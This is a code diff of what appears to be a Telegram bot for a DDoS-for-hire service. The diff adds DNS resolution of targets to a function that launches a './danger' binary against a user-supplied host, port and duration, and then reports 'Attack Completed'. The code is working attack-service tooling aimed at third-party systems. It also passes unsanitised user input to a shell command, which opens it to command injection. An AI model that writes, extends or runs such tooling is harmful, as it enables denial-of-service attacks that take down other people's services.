@@ -53,29 +53,46 @@ async def manage(update: Update, context: CallbackContext):
         save_users(users)
         await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')
 
+def resolve_target(target):
+    """DNS resolve karega — IP diya to wahi rahega, domain diya to resolve karega"""
+    try:
+        socket.inet_aton(target)
+        return target  # Already an IP
+    except socket.error:
+        try:
+            ip = socket.gethostbyname(target)
+            print(f"[DNS] Resolved {target} → {ip}")
+            return ip
+        except Exception as e:
+            print(f"[DNS] Failed to resolve {target}: {e}")
+            return target
+
+# ... (baaki code same hai, sirf run_attack mein change)
+
 async def run_attack(chat_id, ip, port, duration, context):
     global attack_in_progress
     attack_in_progress = True
-
     try:
+        resolved_ip = resolve_target(ip)
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"*🎯 Target resolved: {ip} → {resolved_ip}:{port}*",
+            parse_mode='Markdown'
+        )
         process = await asyncio.create_subprocess_shell(
-            f"./danger {ip} {port} {duration} 10",
+            f"./danger {resolved_ip} {port} {duration} 10",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
         stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
+        if stdout: print(f"[stdout]\n{stdout.decode()}")
+        if stderr: print(f"[stderr]\n{stderr.decode()}")
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')
     finally:
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*", parse_mode='Markdown')
+
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
